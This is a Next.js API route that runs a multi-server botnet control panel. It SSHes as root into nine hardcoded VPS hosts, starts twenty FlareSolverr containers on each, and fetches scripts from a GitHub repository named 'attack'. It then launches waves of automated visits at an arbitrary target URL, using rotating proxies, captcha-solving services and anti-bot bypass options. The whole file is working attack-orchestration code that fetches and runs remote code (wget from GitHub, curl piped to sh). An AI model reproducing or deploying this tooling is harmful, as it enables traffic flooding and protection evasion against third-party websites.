import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const DEFAULT_SERVERS = [
  { host: '138.68.141.40', username: 'root' },
  { host: '144.126.234.13', username: 'root' },
  { host: '46.101.52.177', username: 'root' },
  { host: '142.93.41.217', username: 'root' },
  { host: '167.99.94.250', username: 'root' },
  { host: '165.22.118.138', username: 'root' },
  { host: '167.71.135.147', username: 'root' },
  { host: '138.68.141.255', username: 'root' },
  { host: '206.189.21.125', username: 'root' }
];

// v13 Setup: install curl_cffi + python-socketio + websocket-client + requests + playwright + FlareSolverr
const SETUP_COMMAND = `export DEBIAN_FRONTEND=noninteractive && \\
apt-get update -qq && apt-get install -y -qq libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libpango-1.0-0 libcairo2 libasound2 libxshmfence1 2>/dev/null; \\
pip3 install curl_cffi 'python-socketio[client]' websocket-client requests playwright --break-system-packages -q 2>/dev/null; \\
pip3 install curl_cffi 'python-socketio[client]' websocket-client requests playwright -q 2>/dev/null; \\
python3 -m playwright install chromium 2>/dev/null; \\
(which docker > /dev/null 2>&1 || (curl -fsSL https://get.docker.com | sh)) && \\
docker pull ghcr.io/flaresolverr/flaresolverr:latest 2>/dev/null && \\
for i in $(seq 1 20); do n=flaresolverr$i; p=$((8190+i)); docker rm -f $n 2>/dev/null; docker run -d --name $n --restart=always -p $p:8191 -e LOG_LEVEL=info --memory=256m ghcr.io/flaresolverr/flaresolverr:latest; done 2>/dev/null; \\
echo SETUP_COMPLETE_V13`;

function sanitizeUrl(url) {
  if (!url || typeof url !== 'string') return null;
  if (!/^https?:\/\//i.test(url)) return null;
  if (/[;&|$(){}!#\n\r\\]/.test(url)) return null;
  if (/['"]/.test(url)) return null;
  return url.trim();
}

function sanitizeNumber(val, defaultVal, min, max) {
  const num = parseInt(val);
  if (isNaN(num) || num < min || num > max) return defaultVal;
  return num;
}

function validateApiKey(req) {
  const authHeader = req.headers.get('x-api-key') || '';
  const validKey = process.env.PANEL_API_KEY;
  if (!validKey || authHeader !== validKey) return false;
  return true;
}

async function runSSHCommand(server, command, timeout = 8000) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let resolved = false;

    const done = (result) => {
      if (!resolved) {
        resolved = true;
        try { conn.end(); } catch(e) {}
        resolve(result);
      }
    };

    const timer = setTimeout(() => {
      done({ status: 'success', output: output.trim() || 'Command sent (timeout)' });
    }, timeout);

    conn.on('ready', () => {
      conn.exec(command, { pty: false }, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          return done({ status: 'error', error: err.message });
        }
        stream.on('data', (data) => { output += data.toString(); });
        stream.stderr.on('data', () => {});
        stream.on('close', () => {
          clearTimeout(timer);
          done({ status: 'success', output: output.trim() || 'Done' });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      done({ status: 'error', error: err.message });
    });

    conn.connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
      keepaliveInterval: 3000,
    });
  });
}

export async function POST(req) {
  if (!validateApiKey(req)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  try {
    const { action, url, durationMin, servers, proxies, waveSize, stayTime, socketUrl, captchaApiKey, captchaService, forceMode, forceProtection } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    if (action === 'setup') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started (v10)"`, 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy') {
      // Download all 3 script files directly on each server from GitHub
      const ghBase = 'https://raw.githubusercontent.com/fanarali881-eng/attack/main';
      const files = ['visit.py', 'browser_engine.py', 'detection_engine.py'];
      const downloadCmds = files.map(f => 
        `wget -q -O /root/${f} '${ghBase}/${f}'`
      ).join(' && ');
      const deployCmd = `${downloadCmds} && wc -c /root/visit.py /root/browser_engine.py /root/detection_engine.py && echo "Script v13 deployed (3 files)"`;
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, deployCmd, 30000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start') {
      const safeUrl = sanitizeUrl(url);
      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
      
      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
      const safeWaveSize = sanitizeNumber(waveSize, 60, 10, 500);
      const safeStayTime = sanitizeNumber(stayTime, 35, 10, 120);

      // Build proxy env vars
      let proxyEnv = '';
      if (proxies && proxies.length > 0) {
        const p = proxies[0];
        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
      }

      const results = await Promise.all(
        serverList.map(async (server) => {
          const escapedUrl = safeUrl.replace(/'/g, "'\\''");
          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; ` +
            `for i in $(seq 1 20); do docker start flaresolverr$i 2>/dev/null; done; ` +
            `${proxyEnv} WAVE_SIZE=${safeWaveSize} STAY_TIME=${safeStayTime} ` +
            (socketUrl ? `SOCKET_URL='${socketUrl.replace(/'/g, '')}' ` : '') +
            (captchaApiKey ? `CAPTCHA_API_KEY='${captchaApiKey.replace(/'/g, '')}' ` : '') +
            (captchaService ? `CAPTCHA_SERVICE='${captchaService.replace(/'/g, '')}' ` : '') +
            (forceMode ? `FORCE_MODE='${forceMode.replace(/'/g, '')}' ` : '') +
            (forceProtection ? `FORCE_PROTECTION='${forceProtection.replace(/'/g, '')}' ` : '') +
            `nohup python3 /root/visit.py '${escapedUrl}' ${safeDuration}` +
            (socketUrl ? ` '${socketUrl.replace(/'/g, '')}'` : '') +
            ` > /root/visit.log 2>&1 & ` +
            `echo "Started v12 - ${safeDuration}min WAVE=${safeWaveSize} STAY=${safeStayTime}s"`;
          
          const r = await runSSHCommand(server, fullCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'status') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"', 10000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'scan') {
      // Quick scan from one server to detect site type
      const safeUrl = sanitizeUrl(url);
      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
      
      const server = serverList[0];
      let proxyEnv = '';
      if (proxies && proxies.length > 0) {
        const p = proxies[0];
        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
      }
      
      const escapedUrl = safeUrl.replace(/'/g, "'\\''");
      const scanCmd = `${proxyEnv} python3 -c "
import sys; sys.path.insert(0,'/root')
exec(open('/root/visit.py').read().split('if __name__')[0])
import json
info = detect_site('${escapedUrl}')
print('SCAN_RESULT:' + json.dumps(info, ensure_ascii=False))
" 2>&1 | grep SCAN_RESULT | head -1`;
      
      const r = await runSSHCommand(server, scanCmd, 30000);
      
      let scanResult = null;
      if (r.output && r.output.includes('SCAN_RESULT:')) {
        try {
          const jsonStr = r.output.split('SCAN_RESULT:')[1].trim();
          scanResult = JSON.parse(jsonStr);
        } catch(e) {}
      }
      
      return NextResponse.json({ scanResult, raw: r.output, host: server.host });

    } else {
      return NextResponse.json({ error: "Unknown action" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
